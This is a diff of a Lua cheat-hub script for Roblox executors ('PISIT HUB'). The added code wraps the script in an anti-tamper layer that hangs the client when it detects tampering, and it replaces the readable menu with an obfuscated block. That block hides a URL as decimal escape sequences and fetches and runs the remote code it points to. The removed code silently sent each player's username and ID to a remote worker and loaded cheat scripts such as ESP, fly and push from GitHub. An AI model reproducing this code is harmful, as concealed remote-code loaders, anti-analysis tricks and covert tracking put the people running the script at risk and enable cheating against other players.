@@ -1,4 +1,57 @@
 -- ====================================================================
+-- PISIT HUB - LAYER 2 SECURED SCRIPT
+-- Advanced Environment & Anti-Tamper Shield
+-- ====================================================================
+
+local _ENV = getfenv and getfenv(0) or _ENV
+local function __INIT_PROTECTION__()
+    local CONFIG = { MAX_LATENCY = 0.25, MAX_STRIKES = 3 }
+    local _rawget = rawget local _pcall = pcall local _osclock = osclock or os.clock
+    local _tostring = tostring local _error = error local _type = type local _stringfind = string.find
+    local latencyStrikes = 0
+    local function terminateSession(reason)
+        _pcall(function() _error("[Runtime Error] Exception code: 0x" .. _tostring(_osclock() * 1000), 0) end)
+        while true do end
+    end
+    local function checkHooks()
+        local functionsToVerify = { "print", "loadstring", "setmetatable", "pairs", "ipairs" }
+        for i = 1, #functionsToVerify do
+            local funcName = functionsToVerify[i]
+            local func = _rawget(_ENV, funcName)
+            if func then
+                local strRep = _tostring(func)
+                if not _stringfind(strRep, "builtin") and not _stringfind(strRep, "0x") then terminateSession("H-1") end
+                if _type(func) ~= "function" then terminateSession("H-2") end
+            end
+        end
+    end
+    local function verifyTiming(callback)
+        local startTime = _osclock()
+        local success, result = _pcall(callback)
+        local endTime = _osclock()
+        if (endTime - startTime) > CONFIG.MAX_LATENCY then
+            latencyStrikes = latencyStrikes + 1
+            if latencyStrikes >= CONFIG.MAX_STRIKES then terminateSession("D-1") end
+        else latencyStrikes = 0 end
+        if not success then _error(result, 0) end
+        return result
+    end
+    local function protectEnvironment()
+        local meta = getmetatable(_ENV) or {}
+        meta.__newindex = function(t, key, value) terminateSession("T-1") end
+        meta.__metatable = "Locked"
+        setmetatable(_ENV, meta)
+    end
+    _pcall(checkHooks) _pcall(protectEnvironment)
+    _ENV.__VERIFY_FLOW__ = verifyTiming
+    _ENV.__CHECK_HOOKS__ = checkHooks
+end
+__INIT_PROTECTION__()
+
+-- [ USER SECURED PAYLOAD (LAYER 1 & UI) ]
+task.spawn(function()
+    local success, err = pcall(function()
+        -- ====================================================================
 -- PISIT HUB - Smart Protected & Merged Script
 -- Verified & Optimized for Roblox Executors
 -- ====================================================================
@@ -512,207 +565,75 @@ else
     -- [ PART 2: USER MAIN UI SCRIPT ]
     task.spawn(function()
         local success, err = pcall(function()
-            -- ====================================================================
--- PISIT x TATA | Main Hub UI (Fixed & Clean Link System)
--- ====================================================================
+            --[[
 
-local successLib, Library = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/PISIT_HUB.bundle.lua"))()
-end)
+██████╗ ██╗███████╗██╗████████╗
+██╔══██╗██║██╔════╝██║╚══██╔══╝
+██████╔╝██║███████╗██║   ██║
+██╔═══╝ ██║╚════██║██║   ██║
+██║     ██║███████║██║   ██║
+╚═╝     ╚═╝╚══════╝╚═╝   ╚═╝
+HUB
 
-if not successLib or not Library then
-    warn("[PISIT HUB] โหลด UI หลักไม่สำเร็จ!")
-    return
+PISIT HUB
+Lua Obfuscator
+
+MODE:
+Balanced / Medium — ปานกลาง
+
+TECHNIQUES:
+Variable Renaming • String Encoding • Proxy Calls • Control Flow • Basic Integrity
+
+Generated locally by PISIT HUB.
+]]--
+
+
+local _bDECGkwxP = function()
+
+    local ok =
+        pcall(function()
+            return type
+        end)
+
+    return ok
+
 end
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local localPlayer = Players.LocalPlayer
+if _bDECGkwxP() then
 
-local success, placeInfo = pcall(function()
-    return MarketplaceService:GetProductInfo(game.PlaceId)
-end)
-local mapName = success and placeInfo.Name or "Unknown Map"
 
-local totalUniqueUsers = 0
+local _tXajlDQ = 0
 
--- ระบบนับคนรันผ่าน Cloudflare
-task.spawn(function()
-    pcall(function()
-        local workerUrl = "https://pisit-vip.qqe22462.workers.dev/"
-        local data = { username = localPlayer.Name, userId = localPlayer.UserId, mapName = mapName, placeId = game.PlaceId }
-        local encodedData = HttpService:JSONEncode(data)
-        local httpRequest = request or http_request or syn and syn.request
+local _EVrKhKyGB = function()
+
+    while _tXajlDQ == 0 do
+
+        _tXajlDQ = 1
+
         
-        if httpRequest then
-            local response = httpRequest({
-                Url = workerUrl,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json", ["X-Pisit-Source"] = "PisitSecureHub2026" },
-                Body = encodedData
-            })
-            if response and response.StatusCode == 200 then
-                local decodedRes = HttpService:JSONDecode(response.Body)
-                if decodedRes and decodedRes.totalUniqueUsers then
-                    totalUniqueUsers = decodedRes.totalUniqueUsers
-                end
-            end
-        end
-    end)
-end)
+local _XQUjTyGVTF = function(f,...)
+    return f(...)
+end
 
--- ไฟล์เสียง pisit.mp3
-task.spawn(function()
-    pcall(function()
-        local soundFileName = "pisit.mp3"
-        local soundRawLink = "https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/pisit.mp3"
-        if writefile and readfile and isfile and not isfile(soundFileName) then
-            writefile(soundFileName, game:HttpGet(soundRawLink))
-        end
-        local sound = Instance.new("Sound")
-        if getcustomasset and isfile and isfile(soundFileName) then
-            sound.SoundId = getcustomasset(soundFileName)
-        else
-            sound.SoundId = soundRawLink
-        end
-        sound.Volume = 2
-        sound.Parent = workspace
-        sound:Play()
-        task.delay(10, function() if sound then sound:Destroy() end end)
-    end)
-end)
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\101\110\99\114\121\112\116\45\120\46\112\97\103\101\115\46\100\101\118\47\83\99\114\105\112\116\115\63\73\100\61\51\49\57\55\49\50\50\57\53\51\52\53\50"))("\51\49\57\55\49\50\50\57\53\51\52\53\50")
 
--- สร้าง Window และ Tabs
-local Window = Library:CreateWindow({ Title = "PISIT x TATA | Main Hub" })
 
-local PlayerTab = Window:CreateTab({ Title = "Player" })
-local CheatTab = Window:CreateTab({ Title = "ช่วยเล่น" })
-local MapTab = Window:CreateTab({ Title = "สคริปต์ประจำแมพ" })
-local SettingTab = Window:CreateTab({ Title = "Setting" })
-
--- Sections
-local EspSection = PlayerTab:CreateSection({ Title = "Visuals (ESP)" })
-local OptSection = PlayerTab:CreateSection({ Title = "Optimization & Performance" })
-local CheatSection = CheatTab:CreateSection({ Title = "Script Executor Helper" })
-local MapScriptSection = MapTab:CreateSection({ Title = "ระบบรันสคริปต์ประจำแมพ" })
-
-local ProfileSection = SettingTab:CreateSection({ Title = "ข้อมูลผู้ใช้งานและแมพ" })
-local StatsSection = SettingTab:CreateSection({ Title = "สถิติการใช้งานสคริปต์" })
-
--- SETTING TAB
-ProfileSection:CreateButton({
-    Title = "👤 ชื่อผู้รัน " .. localPlayer.Name .. " (ID: " .. localPlayer.UserId .. ")",
-    Callback = function()
-        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "PISIT HUB", Text = localPlayer.Name, Duration = 2 })
     end
-})
 
-ProfileSection:CreateButton({
-    Title = "🗺️ แมพปัจจุบัน " .. mapName,
-    Callback = function()
-        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "PISIT HUB", Text = "PlaceId: " .. game.PlaceId, Duration = 2 })
-    end
-})
+end
 
-StatsSection:CreateButton({
-    Title = "📊 จำนวนคนรันทั้งหมด " .. totalUniqueUsers .. " คน",
-    Callback = function()
-        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "PISIT HUB", Text = "ใช้งานไปแล้ว " .. totalUniqueUsers .. " คน", Duration = 2 })
-    end
-})
+_EVrKhKyGB()
 
--- PLAYER TAB
-EspSection:CreateToggle({
-    Title = "ESP ค่าย PISIT หลัก",
-    Default = false,
-    Callback = function(state)
-        if state then
-            pcall(function() if getgenv and getgenv().PisitEspCleanup then getgenv().PisitEspCleanup() end end)
-            task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/ESP.PISIT.HUB"))() end)
-        else
-            pcall(function() if getgenv and getgenv().PisitEspCleanup then getgenv().PisitEspCleanup() end end)
-        end
-    end
-})
 
-OptSection:CreateButton({
-    Title = "ลดความแลค ค่าย PISIT",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/FPS.PISIT.HUB"))() end)
-    end
-})
-
--- CHEAT TAB
-CheatSection:CreateButton({
-    Title = "ESP อิสระค่าย PISIT",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/ESP.AII.PISIT"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริปผลักคน",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/PISIT%20X%20TATA"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริปบิน",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/fly.lua"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริปต์หยุดเวลา",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/Stop"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริป สุคุนะ x PISIT",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/Sukuna.x.PISIT"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริป โกโจ x PISIT",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-X-TATA/refs/heads/main/GOJO"))() end)
-    end
-})
-
-CheatSection:CreateButton({
-    Title = "สคริปต์ นมใหญ่",
-    Callback = function()
-        task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/clemonlang/clemon_roclothes/refs/heads/main/ClemonRC.lua"))() end)
-    end
-})
-
--- ====================================================================
--- MAP TAB: ปุ่มกดตรง รันลิงก์ตรวจแมพออโต้ของมึงทันที
--- ====================================================================
-MapScriptSection:CreateButton({
-    Title = "🟢 รันสคริปต์ประจำแมพ",
-    Callback = function()
-        task.spawn(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/qqe22462-ops/PISIT-HUB/refs/heads/main/mapAII.aoto.PISIT_HUB"))()
-        end)
-        
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "PISIT HUB",
-            Text = "กำลังโหลดระบบตรวจสอบและรันสคริปต์ประจำแมพ...",
-            Duration = 2
-        })
-    end
-})
+end
         end)
         if not success then
             warn("[PISIT HUB Error]: " .. tostring(err))
         end
     end)
 end
+    end)
+    if not success then
+        warn("[PISIT LAYER 2 Error]: " .. tostring(err))
+    end
+end)
